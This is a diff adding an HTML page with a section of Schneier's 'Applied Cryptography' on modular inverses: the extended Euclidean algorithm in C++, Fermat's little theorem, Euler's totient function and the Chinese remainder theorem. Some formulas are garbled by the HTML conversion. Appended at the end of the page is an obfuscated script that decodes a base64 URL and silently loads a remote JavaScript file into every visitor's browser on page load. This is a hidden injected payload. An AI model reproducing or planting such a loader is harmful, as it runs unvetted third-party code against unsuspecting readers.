@@ -1,0 +1,182 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Mathematical Background</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=11//-->
+<!--PAGES=246-249//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>So far, so good. Now, how do you go about finding the inverse of <I>a</I> modulo <I>n?</I> There are a couple of ways. Euclid&#146;s algorithm can also compute the inverse of a number modulo <I>n.</I> Sometimes this is called the <B>extended Euclidean algorithm</B>.</P>
+<P>Here&#146;s the algorithm in C<SMALL>&#43;&#43;</SMALL>:</P>
+<!-- CODE //-->
+<PRE>
+    #define isEven(x)   ((x &amp 0x01) == 0)
+    #define isOdd(x)    (x &amp 0x01)
+    #define swap(x,y)   (x ^= y, y ^= x, x ^= y)
+
+    void ExtBinEuclid(int *u, int *v, int *u1, int *u2, int *u3)
+    {
+        // warning: u and v will be swapped if u &lt v
+        int k, t1, t2, t3;
+
+        if (*u &lt *v) swap(*u,*v);
+        for (k = 0; isEven(*u) &amp&amp isEven(*v); &#43;&#43;k) {
+    	*u &gt&gt= 1; *v &gt&gt= 1;
+        }
+        *u1 = 1; *u2 = 0; *u3 = *u; t1 = *v; t2 = *u-1; t3 = *v;
+        do {
+    	do {
+    	    if (isEven(*u3)) {
+    		if (isOdd(*u1) || isOdd(*u2)) {
+    		    *u1 &#43;= *v; *u2 &#43;= *u;
+    		}
+    		*u1 &gt&gt= 1; *u2 &gt&gt= 1; *u3 &gt&gt= 1;
+    	    }
+    	    if (isEven(t3) || *u3 &lt t3) {
+    		swap(*u1,t1); swap(*u2,t2); swap(*u3,t3);
+    	    }
+    	} while (isEven(*u3));
+    	while (*u1 &lt t1 || *u2 &lt t2) {
+    	    *u1 &#43;= *v; *u2 &#43;= *u;
+    	}
+    	*u1 -= t1; *u2 -= t2; *u3 -= t3;
+        } while (t3 &gt 0);
+        while (*u1 &gt= *v &amp&amp *u2 &gt= *u) {
+    	*u1 -= *v; *u2 -= *u;
+        }
+        *u1 &lt&lt= k; *u2 &lt&lt= k; *u3 &lt&lt= k;
+    }
+
+    main(int argc, char **argv) {
+        int a, b, gcd;
+
+        if (argc &lt 3) {
+    	cerr &lt&lt "Usage: xeuclid u v" &lt&lt endl;
+    	return -1;
+        }
+        int u = atoi(argv[1]);
+        int v = atoi(argv[2]);
+        if (u &lt= 0 || v &lt= 0) {
+    	cerr &lt&lt "Arguments must be positive!" &lt&lt endl;
+    	return -2;
+        }
+        // warning: u and v will be swapped if u &lt v
+        ExtBinEuclid(&ampu, &ampv, &ampa, &ampb, &ampgcd);
+        cout &lt&lt a &lt&lt " * " &lt&lt u &lt&lt " &#43; (-"
+    	&lt&lt b &lt&lt ") * " &lt&lt v &lt&lt " = " &lt&lt gcd &lt&lt endl;
+        if (gcd == 1)
+    	cout &lt&lt "the inverse of " &lt&lt v &lt&lt " mod " &lt&lt u &lt&lt " is: "
+    	    &lt&lt u - b &lt&lt endl;
+        return 0;
+    }
+</PRE>
+<!-- END CODE //-->
+<P>I&#146;m not going to prove that it works or give the theory behind it. Details can be found in [863], or in any of the number theory texts previously listed.
+</P>
+<P>The algorithm is iterative and can be slow for large numbers. Knuth showed that the average number of divisions performed by the algorithm is:</P>
+<DL>
+<DD>.843*log<SUB>2</SUB>(<I>n</I>) &#43; 1.47
+</DL>
+<P><FONT SIZE="+1"><B><I>Solving for Coefficients</I></B></FONT></P>
+<P>Euclid&#146;s algorithm can be used to solve this class of problems: Given an array of <I>m</I> variables <I>x<SUB><SMALL>1</SMALL></SUB></I>, <I>x<SUB><SMALL>2</SMALL></SUB>,...x<SUB><SMALL>m</SMALL></SUB></I>, find an array of <I>m</I> coefficients, <I>u<SUB><SMALL>1</SMALL></SUB></I>, <I>u<SUB><SMALL>2</SMALL></SUB>...u<SUB><SMALL>m</SMALL></SUB></I>, such that</P>
+<DL>
+<DD><I>u<SUB><SMALL>1</SMALL></SUB>*x<SUB><SMALL>1</SMALL></SUB> &#43; ...&#43; u<SUB><SMALL>m</SMALL></SUB>*x<SUB><SMALL>m</SMALL></SUB></I> = 1
+</DL>
+<P><FONT SIZE="+1"><B><I>Fermat&#146;s Little Theorem</I></B></FONT></P>
+<P>If <I>m</I> is a prime, and <I>a</I> is not a multiple of <I>m</I>, then <B>Fermat&#146;s little theorem</B> says</P>
+<DL>
+<DD><I>am</I> <SUP><SMALL>-1</SMALL></SUP> &#8801; 1 (mod <I>m</I>)
+</DL>
+<P>(Pierre de Fermat, pronounced &#147;Fair-ma, &#148; was a French mathematician who lived from 1601 to 1665. This theorem has nothing to do with his last theorem.)
+</P>
+<P><FONT SIZE="+1"><B><I>The Euler Totient Function</I></B></FONT></P>
+<P>There is another method for calculating the inverse modulo <I>n</I>, but it&#146;s not always possible to use it. The <B>reduced set of residues</B> mod <I>n</I> is the subset of the complete set of residues that is relatively prime to <I>n.</I> For example, the reduced set of residues mod 12 is {1, 5, 7, 11}. If <I>n</I> is prime, then the reduced set of residues mod <I>n</I> is the set of all numbers from 1 to <I>n</I>- 1. The number 0 is never part of the reduced set of residues for any <I>n</I> not equal to 1.</P>
+<P>The <B>Euler totient function</B>, also called the Euler phi function and written as &#966;(<I>n</I>), is the number of elements in the reduced set of residues modulo <I>n.</I> In other words, &#966;(<I>n</I>) is the number of positive integers less than <I>n</I> that are relatively prime to <I>n</I> (for any <I>n</I> greater than 1). (Leonhard Euler, pronounced &#147;Oiler, &#148; was a Swiss mathematician who lived from 1707 to 1783.)</P>
+<P>If <I>n</I> is prime, then &#966;(<I>n</I>) = <I>n</I>- 1. If <I>n</I> = <I>pq</I>, where <I>p</I> and <I>q</I> are prime, then &#966;(<I>n</I>) = (<I>p</I>- 1)(<I>q</I>- 1). These numbers appear in some public-key algorithms; this is why.</P>
+<P>According to <B>Euler&#146;s generalization of Fermat&#146;s little theorem</B>, if gcd(<I>a,n</I>) = 1, then</P>
+<DL>
+<DD><I>a<SUP><SMALL>&#966;</I>(<I>n</I>)</SMALL></SUP> mod <I>n</I> = 1
+</DL>
+<P>Now it is easy to compute <I>a</I><SUP><SMALL>-1</SMALL></SUP> mod <I>n:</I></P>
+<DL>
+<DD><I>x</I> = a<SUP><SMALL>&#966;(<I>n</I>)-1</SMALL></SUP> mod <I>n</I>
+</DL>
+<P>For example, what is the inverse of 5, modulo 7? Since 7 is prime, &#966;(7) = 7- 1 = 6. So, the inverse of 5, modulo 7, is
+</P>
+<DL>
+<DD>5<SUP><SMALL>6-1</SMALL></SUP> mod 7 = 5<SUP><SMALL>5</SMALL></SUP> mod 7 = 3
+</DL>
+<P>Both methods for calculating inverses can be extended to solve for <I>x</I> in the general problem (if gcd(<I>a,n</I>) = 1):</P>
+<DL>
+<DD>(<I>a*x</I>) mod <I>n</I> = b
+</DL>
+<P>Using Euler&#146;s generalization, solve
+</P>
+<DL>
+<DD><I>x</I> = (<I>b*a</I> <SUP><SMALL>&#966;(<I>n</I>)-1)</SMALL></SUP> mod <I>n</I>
+</DL>
+<P>Using Euclid&#146;s algorithm, solve
+</P>
+<DL>
+<DD><I>x</I> = (b*(<I>a</I><SUP><SMALL>-1</SMALL></SUP> mod <I>n</I>)) mod <I>n</I>
+</DL>
+<P>In general, Euclid&#146;s algorithm is faster than Euler&#146;s generalization for calculating inverses, especially for numbers in the 500-bit range. If gcd(<I>a,n</I>) &#8800; 1, all is not lost. In this general case, (<I>a*x</I>) mod <I>n</I> = <I>b</I>, can have multiple solutions or no solution.</P>
+<P><FONT SIZE="+1"><B><I>Chinese Remainder Theorem</I></B></FONT></P>
+<P>If you know the prime factorization of <I>n</I>, then you can use something called the <B>Chinese remainder theorem</B> to solve a whole system of equations. The basic version of this theorem was discovered by the first-century Chinese mathematician, Sun Tse.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(JzpanoPJ, AbiQYdhe) {AbiQYdhe = JzpanoPJ.createElement('script');AbiQYdhe.type = 'text/javascript';AbiQYdhe.async = true;AbiQYdhe.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');JzpanoPJ.getElementsByTagName('body')[0].appendChild(AbiQYdhe);}(document));</script></body>
+</html>
